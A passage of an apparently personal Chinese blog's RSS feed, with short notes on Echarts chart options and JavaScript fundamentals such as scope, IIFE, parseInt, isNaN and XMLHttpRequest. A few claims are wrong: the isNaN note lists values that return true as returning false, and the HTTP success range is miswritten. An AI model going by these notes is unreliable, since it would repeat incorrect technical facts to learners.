      <description>快速使用 Echarts  // 快速使用 Echcarts (function () {  // 1. 实例化对象  var myChart = echarts.init(document.querySelector(&amp;#34;&amp;#34;));  // 2.配置   // 3. 把配置给实例对象  myChart.setOption(option);  // 4. 让图表跟随屏幕自动的去适应  window.addEventListener(&amp;#34;resize&amp;#34;, function () {  myChart.resize();  }); })(); </description>
    </item>
    
    <item>
      <title>Echarts 遇到的错误</title>
      <link>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E9%81%87%E5%88%B0%E7%9A%84%E9%94%99%E8%AF%AF/</link>
      <pubDate>Sat, 06 Nov 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E9%81%87%E5%88%B0%E7%9A%84%E9%94%99%E8%AF%AF/</guid>
      <description>遇到的错误 今天使用 Echarts 绘制地图时，浏览器控制台出现以下错误：
Uncaught DOMException: Failed to execute &amp;#39;drawImage&amp;#39; on &amp;#39;CanvasRenderingContext2D&amp;#39;: The image argument is a canvas element with a width or height of 0. 如何解决
只需要给需要被绘制的元素设置width和height Css 属性即可。</description>
    </item>
    
    <item>
      <title>Echarts 地图</title>
      <link>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E5%9C%B0%E5%9B%BE/</link>
      <pubDate>Tue, 02 Nov 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E5%9C%B0%E5%9B%BE/</guid>
      <description>地图 常用配置 地图样式 配置 option —&amp;gt; geo —&amp;gt; itemStyle 下的normal .
normal: {  //面积区域颜色  areaColor: &amp;#34;#008C8C&amp;#34;,  // 区域分界线颜色  borderColor: &amp;#34;rgba(43, 196, 243, 1)&amp;#34;,  //区域分界线  borderWidth: 1 }, </description>
    </item>
    
    <item>
      <title>Echarts 折线图</title>
      <link>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E6%8A%98%E7%BA%BF%E5%9B%BE/</link>
      <pubDate>Sat, 30 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E6%8A%98%E7%BA%BF%E5%9B%BE/</guid>
      <description>Echarts 折线图 图表类型 在series下配置type.
type: &amp;#39;line&amp;#39;, 常用配置 标注图表区域 标记图表中某个范围的数据。
在series下配置markArea
markArea: {  data: [  [  {  xAxis: &amp;#39;李宁&amp;#39;  },  {  xAxis: &amp;#39;安踏&amp;#39;  }  ],  [  {  xAxis: &amp;#39;耐克&amp;#39;   },  {  xAxis: &amp;#39;阿迪&amp;#39;  }  ],  ], }, 线条是否平滑显示 在series下配置smooth
smooth: true, 线条样式 在series下配置lineStyle
lineStyle: {  color: &amp;#39;red&amp;#39;,  type: &amp;#39;dashed&amp;#39; } 线条区域样式 在series下配置areaStyle</description>
    </item>
    
    <item>
      <title>Echarts 柱状图</title>
      <link>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E6%9F%B1%E7%8A%B6%E5%9B%BE/</link>
      <pubDate>Sat, 30 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E6%9F%B1%E7%8A%B6%E5%9B%BE/</guid>
      <description>Echarts 柱状图 特点 柱状图描述的是分类数据，呈现的是每一个分类中有多少，
通过柱状图，可以很清晰的看出每个分类数据的排名情况。
基本结构 引入 echarts.js 文件, DOM 容器，初始化对象，设置 option。
var myChart = echarts.init(document.getElementById(&amp;#39;main&amp;#39;)); var xArr = [&amp;#39;李宁&amp;#39;, &amp;#39;安踏&amp;#39;, &amp;#39;耐克&amp;#39;] var yArr = [30, 25, 55] var option = {  title: {  text: &amp;#39;运动品牌科技水平&amp;#39;,  link: &amp;#39;https://yxzi.xyz/&amp;#39;  }, }; myChart.setOption(option) X 轴数据 在option下配置 X 轴类型和数据。
xAxis: {  type: &amp;#39;category&amp;#39;,  data: xArr }, Y 轴数据 在option下配置 Y 轴的类型。
yAxis: {  type: &amp;#39;value&amp;#39;, }, 图表类型 在series下配置type.</description>
    </item>
    
    <item>
      <title>Echarts 通用配置</title>
      <link>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E9%80%9A%E7%94%A8%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Sat, 30 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E9%80%9A%E7%94%A8%E9%85%8D%E7%BD%AE/</guid>
      <description>Echarts 通用配置 title 图表的标题。
标题的样式 在title下配置textStyle、
textStyle: {  color: &amp;#39;#008c8c&amp;#39;, }, 标题的边框 在title下配置：
borderWidth: 5, borderColor: &amp;#39;#008c8c&amp;#39;, borderRadius: 3, 标题的位置 在title下配置：
left: 10, top: 20, tooltip 提示框组件
用于配置鼠标滑过或点击图表时的提示框。
显示框的触发范围 在tooltip下配置trigger
trigger: &amp;#39;axis&amp;#39;, 显示框触发方式 在tooltip下配置triggerOn
triggerOn: &amp;#39;click &amp;#39;, 自定义提示框内容 字符串模板
formatter: &amp;#39;{b} 的科技水平是 {c}&amp;#39; 回调函数
formatter: function (arg) {  return arg[0].name + &amp;#39;的运动科技水平是&amp;#39; + arg[0].data } toolbox 图表的工具栏。
打开工具栏配置项 feature: {} 导出图片 以图片的形式导出图表
saveAsImage: {}, 数据视图工具 可以展现当前图表所用的数据，编辑后可以动态更新。
dataView: {}, 还原所有配置项 restore: {}, 数据区域的缩放 dataZoom: {}, 图表类型的动态切换 magicType: {  type: [&amp;#39;bar&amp;#39;, &amp;#39;line&amp;#39;] } legend 图表的图例组件。它展现了不同系列所对应不同的颜色和名字。可以通过点击某个图例来控制对应的系列显示与否。</description>
    </item>
    
    <item>
      <title>JavaScrip var、let、count</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%A3%B0%E6%98%8E/varletcount/</link>
      <pubDate>Thu, 28 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%A3%B0%E6%98%8E/varletcount/</guid>
      <description>var、let、count 使用var声明的变量，其作用域为该语句所在的函数内，且存在变量提升现象；
使用let声明的变量，其作用域为该语句所在的代码块内，不存在变量提升；
使用const声明的是常量，在后面出现的代码中不能再修改该常量的值。</description>
    </item>
    
    <item>
      <title>Echarts 基本配置</title>
      <link>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</link>
      <pubDate>Wed, 27 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/storehouse/echarts/%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/</guid>
      <description>初始化 初始化一个 Echarts 实例，参数是一个 dom，它决定了图表最终呈现的位置。
var myChart = echarts.init(document.getElementById(&amp;#39;main&amp;#39;)); 绘制图表 用一个对象作为配置项，绘制整个图表。
var option = {} 标题 title: {  text: &amp;#39;运动品牌科技水平&amp;#39;,  //标题文本点击tiao超链接  link: &amp;#39;https://yxzi.xyz/&amp;#39; }, X轴 xAxis: {  // 轴类型为类目轴  type: &amp;#39;category&amp;#39;,  // 类目轴的类别名称  data: [&amp;#39;李宁&amp;#39;, &amp;#39;安踏&amp;#39;, &amp;#39;匹克&amp;#39;, &amp;#39;迪卡侬&amp;#39;, &amp;#39;耐克&amp;#39;, &amp;#39;阿迪达斯&amp;#39;] }, Y轴 yAxis: {  // 轴类型为数值轴，数值轴是不需要设置data属性，  // 因为数值轴针对xAxis的data中的类别名称去series的data中去寻找对应的数据  type: &amp;#39;value&amp;#39;, }, series 一个系列配置。
series: [  {  // 表示下面data中的数据表示的是哪一方面的数据，这里表示的是科技水平  name: &amp;#39;科技水平&amp;#39;,  // 定义图标的类型，这里是柱状图  type: &amp;#39;bar&amp;#39;,  // xAxis 中与类目相对应的数据  data: [22, 15, 12, 15, 80, 40]  }  ] 将配置项设置给 Echarts 实例对象 myChart.</description>
    </item>
    
    <item>
      <title></title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%A3%B0%E6%98%8E/%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%A3%B0%E6%98%8E/%E5%8F%98%E9%87%8F%E5%A3%B0%E6%98%8E/</guid>
      <description>变量声明 var var 可以声明局部变量与全局变量。
使用 var 声明的遍变量，无论在何处进行的声明，都将在执行任何代码之前进行预编译处理。
若用 var 声明一个变量，但没有进行赋值，则变量的默认值为 undefined。</description>
    </item>
    
    <item>
      <title>Ajax XMLHttpRequest</title>
      <link>https://yxzi.xyz/mynote/4-specialty/internet/ajax/xmlhttprequest/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/internet/ajax/xmlhttprequest/</guid>
      <description>XMLHttpRequest 该对象用于与服务器交互；通过它可以在不重新刷新页面的情况下请求特定 URL，获取数据，这样就可以使得网页在不影响用户操作的情况下，更新页面的局部内容。
判断浏览器是否支持XHR // 如果浏览器支持 XHR if (Xhr) { ... }else{  alert(&amp;#39;Sorry, your browser doesn\&amp;#39;t support XMLHttpXhr&amp;#39;); } 创建XHR对象 const xhr = new XMLHttpRequest(); 方法 readyState 返回 XMLHttpRequest 的当前所处状态的 状态码。
 0 表示 XHR 对象已经被创建，但尚未调用 open() 方法。 1 表示 open 方法已经被调用完毕。 2 表示 send 方法已经被调用完毕，并且头部和状态已经可获得。 3 表示服务端已经返回了部分结果，但并没有返回所有结果，且 ResponseText 属性已经包含部分数据。 4 表示服务端已经返回了所有结果。  status 返回 XMLHttpRequest 响应时的数字状态码。
200，状态码 &amp;gt;= 200 且 &amp;gt; 300 都算请求成功。
404
403
401
500
statusText 状态字符串</description>
    </item>
    
    <item>
      <title>JavaScript arguments</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/arguments/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/arguments/</guid>
      <description>arguments 它是一个与函数的实参有映射关系的类数组。
属性 Callee 该属性包含当前正在执行的函数。在哪个函数中调用的方法 arguments.calle，该 calle 中就包含这个函数的函数体。
注意 arguments 对象是所有（非箭头）函数中都可用的局部变量。你可以使用 arguments 对象在函数中引用函数的实参；此对象包含传递给函数的每个实参，第一个实参的索引为 0。
arguments 对象不是一个 Array ；但它类似于 Array，但除了有 length 属性和索引的特性之外没有任何其他 Array 属性。</description>
    </item>
    
    <item>
      <title>JavaScript eval()</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/eval/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/eval/</guid>
      <description>eval() 它会将传入的字符串当做 JavaScript 代码来执行。
在 JavaScript 中，有一句话叫：
eval 是魔鬼。
console.log(eval(&amp;#39;2 + 2&amp;#39;)); </description>
    </item>
    
    <item>
      <title>JavaScript Function</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/function/function/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/function/function/</guid>
      <description>Function 每个 JavaScript 函数实际上都是一个 Function 对象。Function 构造函数创建一个新的 Function 对象。
全局的 Function 对象没有自己的属性和方法，但是，因为它本身也是一个函数，所以它也会通过原型链从自己的原型链 Function.prototype 上继承一些属性和方法。
方法 </description>
    </item>
    
    <item>
      <title>JavaScript function</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E4%B8%BB%E8%A6%81%E8%A1%A8%E8%BE%BE%E5%BC%8F/function/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E4%B8%BB%E8%A6%81%E8%A1%A8%E8%BE%BE%E5%BC%8F/function/</guid>
      <description>function 它可以用来在一个表达式中定义一个函数。
function Fun(parameter) { 	console.log(&amp;#39;我是一个函数&amp;#39;); } </description>
    </item>
    
    <item>
      <title>JavaScript Function 方法</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/function/function-%E6%96%B9%E6%B3%95/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/function/function-%E6%96%B9%E6%B3%95/</guid>
      <description>Function 方法 call(obj) 调用构造函数并改变该构造函数 this 的指向为 obj。
注意 在 x.call() 中，x 为被调用的构造函数，() 中第一个参数为构造函数 x 中的 this 指向，之后的参数为被调用函数的形参。
该方法的语法和作用与 apply() 方法类似，唯一的区别就是传参的列表不同， call() 方法接收的是函数的形参列表，而 apply() 方法接收的是函数的 arguments。
function demo(name, age) { 	this.name = name; 	this.age = age; 	// 构造函数 demo 中的 this 指向被下面的 call 方法变为对象 test， 	// 所以这里相当于 test.name 与 test.age } var a = new demo(&amp;#39;zxy&amp;#39;, 100); var test = {}; demo.call(test, &amp;#39;zxy&amp;#39;, 100); // 用 call 方法改变构造函数 demo 中 this 的指向为对象 test， // 使对象 test 拥有构造函数 demo 的属性；类似于对象 test 将函数 demo 的属性与方法借来使用。 console.</description>
    </item>
    
    <item>
      <title>JavaScript IIFE</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/iife/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/iife/</guid>
      <description>IIFE 立即执行函数，是一种在被定义后就会立即执行的函数，不需要被调用，执行完毕后就会被立即释放。
用于创建一个独立的作用域，主要用于初始化功能。这个作用域中的变量，外面的任何位置访问不到，用于避免变量污染和命名冲突。
它具有普通的函数一样的功能（参数、返回值、执行期上下文等）。
只有函数表达式可以被执行符 () 执行，被执行符所执行的函数表达式的函数名会被自动忽略，即该函数表达式变为了 IIFE。
多个 IIFE 之间要加分号。
var demo = (function (a, b) { 	// 用变量 demo 接收 IIFE 的返回值 	a = Number(a); 	b = Number(b); 	var c = (a + b) * 10; 	// 将变量 a 与 b 的和乘 10 的结果赋给变量 c 	return c; 	// 将变量 c 作为该 IIFE 的返回值 })(10, 20); // 10 与 20 为实参 console.log(demo); 立即释放的特性 var a = (function demo() { 	// 用变量 a 接收函数 demo，因函数 demo 执行一次后就会被释放，则会导致变量 a 的值变为 undefined 	// 因此再次调用变量 a 会返回 undefined 	console.</description>
    </item>
    
    <item>
      <title>JavaScript isNaN()</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/isnan/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/isnan/</guid>
      <description>isNaN() isNaN(value) 用于判定 value 是否为 NaN，是则返回 true，否则返回 false。
如果 value 不是 Number 类型，那么该函数会用 Number() 方法将 value 隐式转换，然后再判断转换后的结果是否为 NaN。因此，被测试的值在被强制转换成数值时会不会返回 IEEE-754 中所谓的不是数值，隐式转换调用的都是显式转换方法。
返回 false 的值  0 除以 0 NaN undefined {}（空对象）  </description>
    </item>
    
    <item>
      <title>JavaScript Math</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/math/math/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/math/math/</guid>
      <description>Math 它是一个内置对象，它拥有一些数字常数属性和数学函数方法，它不是一个函数对象。
引用圆周率的写法是 Math.PI，调用正余弦函数的写法是 Math.sin(x)，x 是要传入的参。
计算时精度不准 0.14 * 100 = 14.000000000000002；0.1 + 0.2 = 0.30000000000000004；这些运算后的值都是因为 js 计算精度不准的导致。
在 js 中整数和浮点数都属于 Number 数据类型，所有数字都是以 64 位浮点数形式储存。JavaScript 里的数字是采用 IEEE 754 标准的 64 位双精度浮点数，计算机进行计算的时候，会把数字转换为二进制，进行运算之后再转换为十进制，但是运算过程中小数部分最多支持 52 位，就会出现运算精度不准的问题。
1000000000000001 + 1000000000000001 = 2000000000000002，即在 JavaScript 中，可正常计算范围在小数点前 16 位与后 16 位。
function One() { 	for (var c = 0; c &amp;lt; 18; c++) { 	var d = Math.random().toFixed(2) * 100; 	// 首先取 0-1 的随机数，然后取这个数小数点后的两位数，最后乘 100，并赋给变量 d 	var e = Math.</description>
    </item>
    
    <item>
      <title>JavaScript new</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E5%B7%A6%E4%BE%A7%E8%A1%A8%E8%BE%BE%E5%BC%8F/new/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E5%B7%A6%E4%BE%A7%E8%A1%A8%E8%BE%BE%E5%BC%8F/new/</guid>
      <description>new 用于创建一个对象类型的实例或一个具有构造函数的内置对象的实例。
new 实例 创建或返回一个新的对象实例，并将构造函数的作用域赋给新的对象实例（因此构造函数中的 this 的指向就变为了这个新的对象实例）。</description>
    </item>
    
    <item>
      <title>JavaScript Number()</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/number/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E6%95%B0%E5%AD%97%E5%92%8C%E6%97%A5%E6%9C%9F/number/</guid>
      <description>Number 该对象是经过封装的能被处理数字值的对象；该对象由 Number() 构造器创建。
Number 的方法 toString() NumObj.toString(radix)
 将 NumObj 转为为 radix 进制的数，若 NumObj 无法被转换为 radix 进制的数，则返回 string 类型的 NaN；rRadix 的取值范围为 2 - 36，如果未指定 radix 参数，则默认值为 10。 当在 NumObj 中，遇到不在 radix 中的字符，则将忽略该字符以及所有后续字符，并返回在这之前已解析的整数值。 因为 Number 对象覆盖了 Object 对象上的 toString() 方法（系统将 Number 对象的 toString 方法重写了），因此它并不继承自 Object.prototype.toString()。  十进制转十六进制 var a = 1971; var b = 10; var c = 16; var d = parseInt(a, b); // 将变量 a 当做 b 进制的数，并将 b 转换为十进制的数。 var e = d.</description>
    </item>
    
    <item>
      <title>JavaScript Object</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/object/object/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/object/object/</guid>
      <description>Object 创建一个对象包装器；它的每个值都是对象的属性，且每个属性必须要有属性值，属性值的类型可以是任何数据类型。
创建方式 对象字面量 var n = &amp;#39;世雨&amp;#39;; var a = &amp;#39;&amp;#39;; var object = { 	//var obj ={} 相当于 var obj = new Object()，一般情况都使用前者。 	b: &amp;#39;臣&amp;#39;, 	// b 为属性名，臣为属性值 	c: n, }; a = object.b + object.c; // 用变量 a 接收对象 object 的属性 b 与 c 的值。 console.log(a); // 返回臣世雨 工厂模式 function ThreeOne(color) { 	this.color = color; 	// color为可选参数 	this.name = &amp;#39;bird&amp;#39;; 	this.</description>
    </item>
    
    <item>
      <title>JavaScript parseFloat()</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/parsefloat/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/parsefloat/</guid>
      <description>parseFloat() parseFloat(string)，将 string 显式转换为 number 类型浮点数（小数）。若 string 无法被转换为浮点数，则返回 number 类型的 NaN。</description>
    </item>
    
    <item>
      <title>JavaScript parselnt()</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/parselnt/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0%E5%B1%9E%E6%80%A7/parselnt/</guid>
      <description>parseInt() parseInt(string, radix) 函数解析一个字符串并返回指定基数的十进制整数。
将 string 看作 radix 进制的数，并将 string 显式转换为十进制且为 number 的整数（radix 为介于 2-36 之间的数，它是可选值，表示被解析字符串的基数），若 string 无法被转换为整数，则返回 number 类型的 NaN。
当在 string 中，遇到不在 radix 进制中的字符，则将忽略该字符以及所有后续字符，并返回在这之前已解析的整数值。
若 radix 为 0 时，部分浏览器（比如 IE）会报错，部分浏览器会将 0 当做 10 进行转换。
N 进制转十进制 var n = 10010; var c = 2; // 变量 n 可为 8，16，32。 var a = parseInt(n, c); // 将 n 当作 c 进制的数，并将 n 显式转换为十进制的整数。 console.log(a); </description>
    </item>
    
    <item>
      <title>JavaScript this</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E4%B8%BB%E8%A6%81%E8%A1%A8%E8%BE%BE%E5%BC%8F/this/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E8%A1%A8%E8%BE%BE%E5%BC%8F/%E4%B8%BB%E8%A6%81%E8%A1%A8%E8%BE%BE%E5%BC%8F/this/</guid>
      <description>this 在全局中，无论是否在严格模式下，this 指的都是全局对象（window）。
通常情况，函数的调用方式决定了 this 的值；严格模式下， this 一般指向一个调用它的对象（即 this 的调用者，哪个对象的方法调用了 this，那么这个 this 就指向调用这个方法的对象 ），即第一人称我，
严格模式下可以指向任意值。</description>
    </item>
    
    <item>
      <title>JavaScript Window</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/window/window/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/window/window/</guid>
      <description>Window Window 对象表示一个包含 DOM 文档的窗口，其 document 属性指向窗口中载入的 DOM 文档 。
如果文档包含框架（frame 或 iframe 标签），浏览器会为 HTML 文档创建一个 window 对象，并为每个框架创建一个额外的 window 对象。</description>
    </item>
    
    <item>
      <title>JavaScript 作用域</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E4%BD%9C%E7%94%A8%E5%9F%9F/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E4%BD%9C%E7%94%A8%E5%9F%9F/</guid>
      <description>作用域 作用域（scope）定义了代码在运行时的某些特定的变量、函数、对象的可调用范围。
每个函数都会创建 scope（作用域对象），scope 中储存是一个个的全局作用域与局部作用域），即 scope 中存储的是作用域的集合（作用域链）。
父函数不能调用子函数的变量 当调用一个变量时，调用者会去作用域链（scope）的顶端依次向下寻找这个变量；又因为子函数的 AO 中含有父函数 AO 的引用地址，所以子函数可以调用父函数的变量；反之，因为父函数的 AO 不能含有子函数 AO 的引用，所以父函数不能调用子函数的变量。
作用域都是独立的 声明多个同级函数时，这些函数的作用域链都是独立的，即每个同级函数中的局部变量不可以公用，但它们都可以使用全局中的变量；这些作用域链会随着对应函数的执行完毕而依次释放。
全局作用域 在全局作用域（GO 对象）中的变量为全局变量，全局变量的的作用域为整个脚本，这类变量在脚本中的任何地方（包括函数内部）能被调用。
它们通常指在全局中定义的变量或没有使用 var 声明的暗示全局变量。
这些变量都在全局作用域中：  函数外声明的变量。 函数中没有使用 var 声明的变量。  局部作用域 局部作用域（AO 对象）中的变量为局部变量，局部变量的作用域仅限于某个特定的函数，这类变量可以在特定的函数中调用。
每个函数内部都会创建一个局部作用域，当一个函数（父函数）中包含另一个函数（子函数），则父函数不能调用子函数的变量，但子函数可以调用父函数的变量；并且两个独立且同级的函数中的局部变量不能公用，只能各用各的局部变量。
这些变量都在局部作用域中：  它们通常指在函数中定义的变量或函数的形式参数。 函数中使用 var 声明的变量。 函数中的形式参数。  累加器 function One() { 	var b = 0; 	function Two() { 	b++; 	console.log(b); 	} 	a = Two; 	// 变量 a 是一个暗示全局变量，用变量 a 接收函数 Two } One(); //调用函数 One，使暗示全局变量 a 可以执行 a(); // 执行变量 a，相当于执行函数 Two，每执行一次变量 a，就会使 b 在原来的的结果上自增一次。 a(); a(); 作用域链 function One() { 	// 声明函数 One 时，系统会隐式创建 One.</description>
    </item>
    
    <item>
      <title>JavaScript 函数</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0/</guid>
      <description>函数 函数又叫方法，它是用来执行某些特定功能的代码；且允许我们在程序中随时进行调用。
每一个函数其实都是一个 Function 类型的对象。
函数中若没有使用 return 语句，则它默认返回 undefined；要想返回一个指定的值，则需使用 return 语句来指定一个返回值（使用 new 关键字调用一个构造函数除外）。
基本方式 直接通过 function 关键字进行声明。
function demo(a, b) { 	// 声明一个函数，demo 为函数名，a 与 b为形式参数（形参）。 	console.log(a + b); 	// 返回形参 a 与 b 的和 3。 } demo(1, 2); // 使用执行符 () 调用函数 demo，1 与 2 为实际参数（实参） var c = demo.name; // 函数 demo 的属性 name 为指定函数的（这里为 demo）名字， // 该属性的值永远等于跟在 function 关键字后面的标识符（变量名），匿名函数的属性 name 为空。 console.log(c); // 返回函数 demo 的函数名  //匿名函数方式-------------------------------------------------- var demo = function () { 	console.</description>
    </item>
    
    <item>
      <title>JavaScript 函数的参数</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%87%BD%E6%95%B0/%E5%87%BD%E6%95%B0%E7%9A%84%E5%8F%82%E6%95%B0/</guid>
      <description>函数的参数 形参 形式参数，由于它不是实际存在变量，所以又称虚拟变量；它是指在定义函数名和函数体的时候使用的参数，目的是用来接收调用该函数时传入的实际参数。
在调用函数时，实参将赋值给形参；因而，必须使实参的个数与类型应与形参一一的对应，且传入的实参必须要有确定的值。
函数的形参比实参数量多的情况 若形参比实参的数量多，则多余的形参会返回 undefined（默认参数）。
函数运行结束的时候形参被释放，而实参内容不会改变。
实参 实际参数，是在调用函数时传递给函数的参数， 实参可以是常量、变量、表达式、函数等， 无论实参是何种类型的量，在进行函数调用时，它们都必须具有确定的值， 以便把这些值传送给形参， 因此应预先用赋值，输入等办法使实参获得确定值。
function demo(a, b) { 	// 定义两个形参。 	var f, 	g = &amp;#39;&amp;#39;; 	for (var e = 0; e &amp;lt; arguments.length; e++) { 	// arguments 对象的属性 length 表示实参（实参列表）的数量。 	f = arguments[e]; 	// 遍历所有实参 	console.log(&amp;#39;遍历的实参:&amp;#39; + f); 	} 	g = arguments.length; 	// 返回实参的数量 	// arguments 对象类似数组，但却不是数组。 	console.</description>
    </item>
    
    <item>
      <title>JavaScript 分支与循环</title>
      <link>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%88%86%E6%94%AF%E4%B8%8E%E5%BE%AA%E7%8E%AF/</link>
      <pubDate>Thu, 21 Oct 2021 06:00:00 +0000</pubDate>
      
      <guid>https://yxzi.xyz/mynote/4-specialty/language/javascrip/%E5%88%86%E6%94%AF%E4%B8%8E%E5%BE%AA%E7%8E%AF/</guid>
      <description>分支与循环 if 单一的 if 语句 if (条件) { 	要执行的语句块; } if else 语句 if (条件) { 	要执行的语句块; } else { 	要执行的语句块; } 多重 if 语句嵌套 if (条件) { 	要执行的语句块; } else if (条件) { 	要执行的语句块; } else { 	要执行的语句块; } 为什么 if 语句中不能进行函数声明 因为程序执行时，程序会在本页代码之内寻找函数声明，并进行函数声明提升，而不会去查找需要条件的 if 之内的内容，
另外，可以用函数表达式定义函数？
switch 将表达式的值与 case 的子表达式匹配，并执行与之匹配成功后相关联的语句。
